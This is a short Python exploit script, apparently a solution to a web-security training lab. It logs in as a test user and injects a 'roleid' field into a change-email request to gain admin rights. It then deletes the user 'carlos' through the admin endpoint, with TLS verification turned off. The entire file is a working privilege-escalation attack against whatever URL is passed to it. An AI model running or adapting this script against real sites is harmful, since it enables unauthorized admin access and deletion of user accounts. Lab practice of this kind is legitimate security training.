import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_login_successful(url, session):
    login_url = url + "/login"
    data = {
    "username": "wiener",
    "password": "peter"}
    response = session.post(
         login_url,
         data=data,
         verify=False,
         proxies=proxies)
    return "Log out" in response.text

def is_change_role_successful(url, session):
    change_email_url = (
            url + "/my-account/change-email")
    data_role_change = {
            "email":"test@test.ca",
            "roleid": 2}
    response = session.post(
            change_email_url,
            json=data_role_change,
            verify=False,
            proxies=proxies)
    return 'Admin' in response.text

def is_delete_carlos_successful(url, session):
    delete_carlos_user_url = (
        url + "/admin/delete?username=carlos")
    response = session.get(
        delete_carlos_user_url,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        if not is_change_role_successful(url, session):
            print("[-] Changing role was not successful.")
            sys.exit(FAIL)
        if not is_delete_carlos_successful(url, session):
            print("[-] Deleting carlos was not successful.")
            sys.exit(FAIL)
        print("[+] The Access Control attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com' % sys.argv[0]")
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 